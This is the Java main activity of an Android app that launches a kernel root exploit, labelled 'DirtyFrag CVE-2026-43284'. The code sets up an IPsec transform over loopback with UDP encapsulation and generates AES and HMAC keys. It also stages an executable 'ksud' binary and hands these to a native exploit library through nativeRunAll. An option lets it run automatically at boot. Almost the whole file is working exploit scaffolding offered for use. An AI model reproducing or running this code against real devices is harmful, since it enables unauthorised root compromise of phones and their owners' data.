package df.root;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;

import androidx.appcompat.app.AppCompatActivity;

import df.root.databinding.ActivityMainBinding;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity implements IReporter {

    private static final String TAG = "dfroot";

    static { System.loadLibrary("exp"); }

    private ActivityMainBinding binding;
    private final Handler mMain = new Handler(Looper.getMainLooper());
    private final Executor mExec = Executors.newSingleThreadExecutor();

    public void report(String msg) {
        mMain.post(() -> {
            binding.outputView.append(msg);
            binding.outputScroll.post(() -> binding.outputScroll.fullScroll(View.FOCUS_DOWN));
        });
    }

    static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                    int senderPort, String ksudPath, boolean skipSoftReboot);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        setSupportActionBar(binding.toolbar);

        if (new File("/dev/df").exists()) binding.btnRun.setEnabled(false);

        binding.btnRun.setOnClickListener(v -> {
            binding.btnRun.setEnabled(false);
            binding.outputView.setText("");
            mExec.execute(() -> runExploit());
        });

        ComponentName bootReceiver = new ComponentName(this, BootReceiver.class);
        int state = getPackageManager().getComponentEnabledSetting(bootReceiver);
        binding.switchBootStart.setChecked(state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
        binding.switchBootStart.setOnCheckedChangeListener((btn, checked) ->
            getPackageManager().setComponentEnabledSetting(bootReceiver,
                checked ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                        : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP));
    }

    private void runExploit() {
        try {
            log(DeviceCheck.report());
            if (!DeviceCheck.preflight("manual")) {
                log("\npreflight FAILED: required paths missing - nothing was patched.");
                return;
            }

            IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);

            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            log("encap port: " + encapPort);

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            IpSecManager.SecurityParameterIndex spiObj =
                    ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            log("spi: 0x" + Integer.toHexString(spiVal));

            SecureRandom rng = new SecureRandom();
            byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);

            IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            IpSecTransform transform = new IpSecTransform.Builder(this)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            stageAsset(this, "ksud", true, getFilesDir());
            log("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath());
            log("running native exploit...");

            int icvLen = 128 / 8;
            String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, true);

            transform.close();
            spiObj.close();
            encapSock.close();

        } catch (Exception e) {
            Log.e(TAG, "exploit exception", e);
            log("\nexception: " + e);
        } finally {
            mMain.post(() -> {
                binding.btnRun.setEnabled(true);
                binding.btnRun.setText("Launch Root (DirtyFrag CVE-2026-43284)");
            });
        }
    }

    static void stageAsset(Context ctx, String name, boolean executable, File dir) throws IOException {
        File dest = new File(dir, name);
        File tmp = new File(dest.getPath() + ".tmp");
        try (InputStream in = ctx.getAssets().open(name);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) out.write(buf, 0, n);
        }
        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
        if (executable) dest.setExecutable(true, false);
    }

    private void log(String msg) {
        Log.i(TAG, msg);
        report(msg + "\n");
    }
}
